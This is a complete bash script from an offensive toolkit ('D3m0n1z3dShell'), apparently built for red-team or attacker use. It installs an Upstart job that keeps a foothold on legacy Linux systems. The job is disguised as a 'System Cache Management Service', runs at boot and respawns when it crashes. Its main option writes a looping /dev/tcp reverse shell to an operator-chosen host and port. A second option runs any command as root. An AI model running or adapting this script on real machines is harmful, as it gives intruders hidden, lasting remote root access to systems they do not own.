#!/bin/bash
# D3m0n1z3dShell — Upstart Service Persistence (T1543)
# Based on Metasploit init_upstart.rb — Legacy Ubuntu/CentOS 6 init

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_upstart"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   Upstart Service Persistence                     ║"
    echo " ║   T1543 — Legacy Ubuntu/CentOS 6 init system      ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

check_upstart(){
    if ! command -v initctl >/dev/null 2>&1; then
        echo -e "${RED}[-] Upstart not found (initctl missing)${NC}"
        echo -e "${YELLOW}[*] This technique is for Ubuntu 9.10-14.10, CentOS 6, Fedora 9-14${NC}"
        return 1
    fi
    if [[ ! -d /etc/init ]]; then
        echo -e "${RED}[-] /etc/init/ directory not found${NC}"
        return 1
    fi
    return 0
}

install_job(){
    local JOB_NAME="$1" PAYLOAD="$2"
    local JOB_FILE="/etc/init/${JOB_NAME}.conf"

    cat > "$JOB_FILE" << EOF
# ${MARKER}
description "System Cache Management Service"

start on runlevel [2345]
stop on runlevel [!2345]

respawn
respawn limit 10 5

exec ${PAYLOAD}
EOF

    echo -e "${GREEN}[+] Upstart job installed: ${JOB_FILE}${NC}"
    echo -e "${YELLOW}[*] Starts on runlevel 2-5, respawns on crash${NC}"

    initctl reload-configuration 2>/dev/null

    read -p "Start job now? [y/N]: " START
    if [[ "$START" =~ ^[Yy]$ ]]; then
        initctl start "$JOB_NAME" 2>/dev/null
        echo -e "${GREEN}[+] Job started${NC}"
    fi
}

menu(){
    banner
    check_root
    check_upstart || return 1

    echo -e "  ${CYAN}[1]${NC} Install job (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install job (custom command)"
    echo -e "  ${CYAN}[3]${NC} List d3m0n jobs"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-4]: " OPT

    case "$OPT" in
        1)
            read -p "  Job name [system-cache]: " JOB
            JOB="${JOB:-system-cache}"
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="/bin/sh -c 'while true; do /bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null; sleep 60; done'"
            install_job "$JOB" "$PAYLOAD"
            ;;
        2)
            read -p "  Job name [system-cache]: " JOB
            JOB="${JOB:-system-cache}"
            read -p "  Command: " CMD
            install_job "$JOB" "$CMD"
            ;;
        3)
            echo -e "${CYAN}[*] D3m0n Upstart jobs:${NC}"
            grep -rl "$MARKER" /etc/init/ 2>/dev/null | while read -r f; do
                local job=$(basename "${f%.conf}")
                local status=$(initctl status "$job" 2>/dev/null)
                echo -e "  ${GREEN}→${NC} ${job}: ${status}"
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Removing d3m0n Upstart jobs...${NC}"
            grep -rl "$MARKER" /etc/init/ 2>/dev/null | while read -r f; do
                local job=$(basename "${f%.conf}")
                initctl stop "$job" 2>/dev/null
                rm -f "$f"
                echo -e "  ${GREEN}[+] Removed: ${job}${NC}"
            done
            initctl reload-configuration 2>/dev/null
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
